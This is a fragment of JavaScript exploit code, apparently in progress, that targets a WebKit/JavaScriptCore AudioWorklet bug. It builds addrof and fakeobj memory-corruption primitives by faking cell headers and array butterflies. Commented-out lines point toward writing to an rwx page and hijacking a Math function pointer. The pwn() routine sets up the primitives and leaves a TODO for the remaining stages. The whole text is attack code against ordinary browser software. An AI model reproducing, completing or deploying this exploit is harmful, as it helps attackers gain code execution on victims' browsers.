            //port.postMessage(ShiftRight(new Int64(hex1(rwx)),4))
            //stage2.write64(exe,0x55555555)
            //stage2.write64(mathfunc,0x4141414141)
            //Math.sin()
            /*while(!(port1.onmessage())) {
                port.postMessage("not")
            }
            //port.onmessage = ;
            port.onmessage = (e) => {
                port.postMessage("gotit")
            }*/
            
            //var propertyAddr = addr;

            //var value = stage2.read(addr,8);
            //port.postMessage("value" + value)


        /*var addr1 = addrof({a:0x1337});
        var fb = fakeobj(addr1)

        port.postMessage("addrof {}" + hex1(fb.a))
        var obj = {
          jsCellHeader: qwordAsTagged(0x0108230700000000),
          fakeButterfly: a0
        };
        port.postMessage("here debug");
        let addr = addrof(obj);
        port.postMessage("Found obj @ " + hex1(addr));
        //port.postMessage("obj @ " + addr.toString(16));
        let fakeArr = fakeobj(addr + 0x10);
        // subtract off the incref
        doubleArrayCellHeader = floatAsQword(fakeArr[0]) - 0x1;
        port.postMessage("double array header @ " + hex1(doubleArrayCellHeader));
        //port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
        // fix broken cell header
        var doublebfly = floatAsQword(fakeArr[1])
        port.postMessage("double array butterfly @ " + hex1(doublebfly));
        fakeArr[0] = qwordAsFloat(doubleArrayCellHeader);
        port.postMessage("debug1")
        // grab a real butterfly pointer
        let doubleArrayButterfly = floatAsQword(fakeArr[1]);
        port.postMessage("debug2")
        // fix other broken cell header
        obj.fakeButterfly = b0;
        port.postMessage("debug3")
        fakeArr[0] = qwordAsFloat(doubleArrayCellHeader);
        port.postMessage("debug4")
        // fix the broken butterflys and setup cleaner addrof / fakeobj
        obj.jsCellHeader = qwordAsTagged(doubleArrayCellHeader);
        port.postMessage("debug4")
        //here
        obj.fakeButterfly = a1;
        port.postMessage("debug5")
        //port.postMessage(hex1(qwordAsTagged(doublebfly)))
        fakeArr[1] = qwordAsFloat(doublebfly);
        port.postMessage("debug6")
        obj.fakeButterfly = b1;
        port.postMessage("debug7")
        fakeArr[1] = qwordAsFloat(doublebfly);
        fakeobj = (addr) => {
          a1[offset] = qwordAsFloat(addr);
          return b1[0];
        }
        addrof = (val) => {
          b1[offset] = val;
          return floatAsQword(a1[0]);
        }*/ 

      }
      function pwn() {
        try {
          setupPrimitives();
          // ensure we can survive GC
          //gc();
          // TODO: rest of exploit goes here
          port.postMessage("done!");
        } catch(e) { // send exception strings to main thread (for debugging)
          port.postMessage("Exception!!");
          port.postMessage(e.toString());
        }
      }
      registerProcessor("a", class {
        constructor() {
          // setup a message port to the main thread
          port = new AudioWorkletProcessor().port;
          //port1 = new AudioWorkletProcessor().port;
          port.onmessage = pwn;

          // this part is magic
          // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
          eval('1 + 0x1336');
          // overwrite a1's butterfly with a fastMalloc pointer
          return {fill: 1, a: a0};
        }
      });
      registerProcessor("b", class {
        constructor() {
            /*port.onmessage = (e) => {
                port1.postMessage("recieved!!!")
            }*/
            //port1 = new AudioWorkletProcessor().port;
          // overwrite b1's butterfly with a fastMalloc pointer
          return {fill: 1, b: b0};
        }
      });
      //return stage2
